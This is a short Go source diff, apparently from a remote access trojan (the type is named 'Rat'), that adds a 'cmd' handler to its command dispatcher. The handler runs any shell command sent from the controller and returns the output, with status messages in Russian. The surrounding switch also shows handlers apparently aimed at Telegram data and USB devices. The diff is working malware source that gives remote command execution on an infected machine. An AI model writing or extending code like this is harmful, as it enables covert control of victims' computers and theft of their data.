@@ -38,6 +38,8 @@ func (r *Rat) commandsSwitch(text string) {
 		go r.findTgCmd()
 	case "usb":
 		go r.usbCmd(args)
+	case "cmd":
+		go r.cmdCmd(args)
 	default:
 		go r.defaultCmd()
 	}
@@ -232,4 +234,14 @@ func (r *Rat) usbCmd(args string) {
 		r.Transport.Send("Неизвестное действие: %s", cmd)
 		return
 	}
+}
+
+func (r *Rat) cmdCmd(args string) {
+	out, err := r.Engine.System.Exec(args)
+	if err != nil {
+		r.Transport.Send("Ошибка: %v", err)
+		return
+	}
+
+	r.Transport.Send("Результат:\n%s", out)
 }
